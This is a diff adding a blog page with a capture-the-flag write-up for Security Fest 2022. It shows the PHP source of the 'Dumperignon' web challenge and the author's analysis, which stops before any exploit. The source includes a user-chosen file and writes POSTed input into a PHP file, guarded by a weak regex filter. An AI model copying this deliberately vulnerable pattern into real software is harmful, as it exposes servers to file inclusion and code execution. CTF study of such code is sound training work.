@@ -1,0 +1,532 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 5.4.1">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.0.0/css/all.min.css" integrity="sha256-jTIdiMuX/e3DGJUGwl3pKSxuc6YOuqtJYkM0bGQESA4=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.10.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":{"gitalk":{"order":-2}}},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.xml","localsearch":{"enable":"ture","trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="玩玩">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Security Fest 2022 wp">
+<meta property="og:url" content="http://example.com/2022/06/02/Security-Fest-2022/index.html">
+<meta property="og:site_name" content="b1ue0cean&#39;s   blog">
+<meta property="og:description" content="玩玩">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2022/06/02/Security-Fest-2022/image-20220603162315060.png">
+<meta property="og:image" content="http://example.com/2022/06/02/Security-Fest-2022/image-20220603001238754.png">
+<meta property="og:image" content="http://example.com/2022/06/02/Security-Fest-2022/image-20220603004126183.png">
+<meta property="og:image" content="http://example.com/2022/06/02/Security-Fest-2022/image-20220603001837561.png">
+<meta property="og:image" content="http://example.com/2022/06/02/Security-Fest-2022/image-20220603150802759.png">
+<meta property="og:image" content="http://example.com/2022/06/02/Security-Fest-2022/image-20220603155219679.png">
+<meta property="article:published_time" content="2022-06-02T13:09:51.000Z">
+<meta property="article:modified_time" content="2022-06-05T09:52:07.953Z">
+<meta property="article:author" content="b1ue0cean">
+<meta property="article:tag" content="ctf">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2022/06/02/Security-Fest-2022/image-20220603162315060.png">
+
+
+<link rel="canonical" href="http://example.com/2022/06/02/Security-Fest-2022/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://example.com/2022/06/02/Security-Fest-2022/","path":"2022/06/02/Security-Fest-2022/","title":"Security Fest 2022 wp"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Security Fest 2022 wp | b1ue0cean's   blog</title>
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+<link rel="alternate" href="/atom.xml" title="b1ue0cean's   blog" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">b1ue0cean's   blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">welcome to my world -- sharing CTF & ML skills</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-home"><a href="/" rel="section">Home</a></li>
+        <li class="menu-item menu-item-about"><a href="/about/" rel="section">About</a></li>
+        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section">Tags<span class="badge">35</span></a></li>
+        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section">Categories<span class="badge">18</span></a></li>
+        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section">Archives<span class="badge">56</span></a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#web"><span class="nav-number">1.</span> <span class="nav-text">web</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Dumperignon"><span class="nav-number">1.1.</span> <span class="nav-text">Dumperignon</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#nofkntax-all-web-is-guess"><span class="nav-number">1.2.</span> <span class="nav-text">nofkntax(all,web,is,guess?)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Madness"><span class="nav-number">1.3.</span> <span class="nav-text">Madness</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="b1ue0cean"
+      src="/uploads/avatar.jpeg">
+  <p class="site-author-name" itemprop="name">b1ue0cean</p>
+  <div class="site-description" itemprop="description">我就是我，人间不一样的烟火</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">56</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">18</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">35</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author site-overview-item animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/godrun666" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;godrun666" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:1019076587@qq.com" title="E-Mail → mailto:1019076587@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://twitter.com/b1ue0cean7" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;b1ue0cean7" rel="noopener" target="_blank"><i class="fab fa-twitter fa-fw"></i>Twitter</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://blog.csdn.net/qq_53755216" title="CSDN → https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_53755216" rel="noopener" target="_blank">CSDN</a>
+      </span>
+  </div>
+  <div class="cc-license site-overview-item animated" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdn.jsdelivr.net/npm/@creativecommons/vocabulary@2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/06/02/Security-Fest-2022/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/uploads/avatar.jpeg">
+      <meta itemprop="name" content="b1ue0cean">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="b1ue0cean's   blog">
+      <meta itemprop="description" content="我就是我，人间不一样的烟火">
+    </span>
+    
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Security Fest 2022 wp | b1ue0cean's   blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Security Fest 2022 wp
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2022-06-02 21:09:51" itemprop="dateCreated datePublished" datetime="2022-06-02T21:09:51+08:00">2022-06-02</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2022-06-05 17:52:07" itemprop="dateModified" datetime="2022-06-05T17:52:07+08:00">2022-06-05</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <p>玩玩</p>
+<span id="more"></span>
+
+<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="Dumperignon"><a href="#Dumperignon" class="headerlink" title="Dumperignon"></a><strong>Dumperignon</strong></h3><blockquote>
+<p><a target="_blank" rel="noopener" href="http://dumperignon-01.hackaplaneten.se/?source">dumperignon-01.hackaplaneten.se/?source</a><br>What would you rather pop, bottles or shells?</p>
+</blockquote>
+<p>真的是好久好久好久好久没做php了</p>
+<p>source</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="literal">TRUE</span>);</span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(E_ALL);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;allow_url_fopen&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;allow_url_include&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;open_basedir&quot;</span>, <span class="string">&quot;/var/www&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">nohack</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/(\.\.+|^\/|^(file|http|https|ftp):)/i&quot;</span>, <span class="string">&quot;XXX&quot;</span>, <span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>)&#123;</span><br><span class="line">        <span class="variable">$_POST</span>[<span class="variable">$key</span>] = <span class="title function_ invoke__">nohack</span>(<span class="variable">$val</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>)&#123;</span><br><span class="line">        <span class="variable">$_GET</span>[<span class="variable">$key</span>] = <span class="title function_ invoke__">nohack</span>(<span class="variable">$val</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$_REQUEST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>)&#123;</span><br><span class="line">        <span class="variable">$_REQUEST</span>[<span class="variable">$key</span>] = <span class="title function_ invoke__">nohack</span>(<span class="variable">$val</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">        <span class="title function_ invoke__">set_include_path</span>(<span class="string">&quot;/var/www/messages&quot;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Message contents: &lt;br&gt;\n&lt;pre&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>]) &gt; <span class="number">1000</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;too big file&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$filename</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]).<span class="title function_ invoke__">rand</span>(<span class="number">1</span>,<span class="number">1337</span>).<span class="string">&quot;.msg&quot;</span>;</span><br><span class="line">        <span class="variable">$fp</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;/var/www/messages/&quot;</span>.<span class="variable">$filename</span>, <span class="string">&#x27;wb&#x27;</span>);</span><br><span class="line">        <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="string">&quot;&lt;?php var_dump(&quot;</span>.<span class="title function_ invoke__">var_export</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>], <span class="literal">true</span>).<span class="string">&quot;)?&gt;&quot;</span>);</span><br><span class="line">        <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: /?file=&#x27;</span>.<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;html lang=<span class="string">&quot;en-US&quot;</span>&gt;</span><br><span class="line">   &lt;head id=<span class="string">&quot;head&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;Dumperignon&lt;/title&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">        <span class="comment">/* nothing chall related here, I hope */</span></span><br><span class="line"></span><br><span class="line">body, html &#123;</span><br><span class="line">    height: <span class="number">100</span>%;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  .bg::<span class="variable constant_">before</span> &#123;</span><br><span class="line">    content: <span class="string">&quot;&quot;</span>;</span><br><span class="line">    top: <span class="number">0</span>;</span><br><span class="line">    left: <span class="number">0</span>;</span><br><span class="line">    width: <span class="number">100</span>%;</span><br><span class="line">    height: <span class="number">100</span>%;</span><br><span class="line">    position: absolute;</span><br><span class="line">    background-position: center;</span><br><span class="line">    background-repeat: no-repeat;</span><br><span class="line">    background-size: cover;</span><br><span class="line">    filter: <span class="title function_ invoke__">blur</span>(<span class="number">3</span>px);</span><br><span class="line">    background-image: <span class="title function_ invoke__">url</span>(https:<span class="comment">//wallpaperaccess.com/full/3016743.jpg);</span></span><br><span class="line">  &#125;</span><br><span class="line">  textarea &#123;</span><br><span class="line">  width: <span class="number">100</span>%;</span><br><span class="line">  height: <span class="number">150</span>px;</span><br><span class="line">  padding: <span class="number">12</span>px <span class="number">20</span>px;</span><br><span class="line">  box-sizing: border-box;</span><br><span class="line">  border: <span class="number">2</span>px solid <span class="comment">#ccc;</span></span><br><span class="line">  border-radius: <span class="number">4</span>px;</span><br><span class="line">  background-color: <span class="comment">#f8f8f8;</span></span><br><span class="line">  font-size: <span class="number">16</span>px;</span><br><span class="line">  overflow:hidden;</span><br><span class="line">&#125;</span><br><span class="line">input &#123;</span><br><span class="line">    width: <span class="number">100</span>%;</span><br><span class="line">  background-color: <span class="comment">#784caf; /* Green */</span></span><br><span class="line">  border: <span class="number">1</span>px solid black;</span><br><span class="line">  color: white;</span><br><span class="line">  padding: <span class="number">15</span>px <span class="number">32</span>px;</span><br><span class="line">  text-align: center;</span><br><span class="line">  text-decoration: none;</span><br><span class="line">  display: inline-block;</span><br><span class="line">  font-size: <span class="number">16</span>px;</span><br><span class="line">&#125;</span><br><span class="line">  .bg-inside &#123;</span><br><span class="line">    text-align: center;</span><br><span class="line">    font: bold <span class="number">42</span>px sans-serif;</span><br><span class="line">    width: <span class="number">600</span>px;</span><br><span class="line">    height: <span class="number">300</span>px;</span><br><span class="line">    </span><br><span class="line">    position: absolute;</span><br><span class="line">    top:<span class="number">0</span>;</span><br><span class="line">    bottom: <span class="number">0</span>;</span><br><span class="line">    left: <span class="number">0</span>;</span><br><span class="line">    right: <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    margin: auto;</span><br><span class="line">  &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">bg</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">bg</span>-<span class="title">inside</span>&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">form</span> <span class="title">method</span>=&quot;<span class="title">POST</span>&quot; <span class="title">action</span>=&quot;/&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">textarea</span> <span class="title">name</span>=&quot;<span class="title">file</span>&quot; <span class="title">required</span> <span class="title">placeholder</span>=&quot;<span class="title">Enter</span> <span class="title">message</span> <span class="title">contents</span>...&quot;&gt;&lt;/<span class="title">textarea</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">submit</span>&quot; <span class="title">value</span>=&quot;<span class="title">Save</span>&quot; /&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">  </span></span><br><span class="line"><span class="class">&lt;/<span class="title">body</span>&gt;&lt;/<span class="title">html</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span> &#125; ?&gt;</span></span><br><span class="line"><span class="class">1</span></span><br></pre></td></tr></table></figure>
+
+<p>先理一理这题啥意思</p>
+<blockquote>
+<p>PHP <code>ini_set</code>用来设置php.ini的值，在函数执行的时候生效，脚本结束后，设置失效。无需打开php.ini文件，就能修改配置，对于虚拟空间来说，很方便。 </p>
+</blockquote>
+<p>限制死了文件包含。。。 但是限制了 <code>open_basedir</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;allow_url_fopen&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;allow_url_include&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;open_basedir&quot;</span>, <span class="string">&quot;/var/www&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>然后把每个请求都用 这玩意过滤了一下  意思就是把<strong>四种</strong>请求头给过滤了</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">nohack</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/(\.\.+|^\/|^(file|http|https|ftp):)/i&quot;</span>, <span class="string">&quot;XXX&quot;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>然后就是有个请求文件的路由  一个查看 一个上传 GET 和 POST</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">set_include_path</span>(<span class="string">&quot;/var/www/messages&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Message contents: &lt;br&gt;\n&lt;pre&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后是POST 但是后面有点奇怪 包含了一堆 html 进去 不知道有没有什么操作空间</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>]) &gt; <span class="number">1000</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;too big file&quot;</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125; <span class="comment">// 文件不能太长</span></span><br><span class="line">    <span class="variable">$filename</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]).<span class="title function_ invoke__">rand</span>(<span class="number">1</span>,<span class="number">1337</span>).<span class="string">&quot;.msg&quot;</span>;  <span class="comment">// 上传以后重命名</span></span><br><span class="line">    <span class="variable">$fp</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;/var/www/messages/&quot;</span>.<span class="variable">$filename</span>, <span class="string">&#x27;wb&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="string">&quot;&lt;?php var_dump(&quot;</span>.<span class="title function_ invoke__">var_export</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>], <span class="literal">true</span>).<span class="string">&quot;)?&gt;&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: /?file=&#x27;</span>.<span class="variable">$filename</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br></pre></td></tr></table></figure>
+
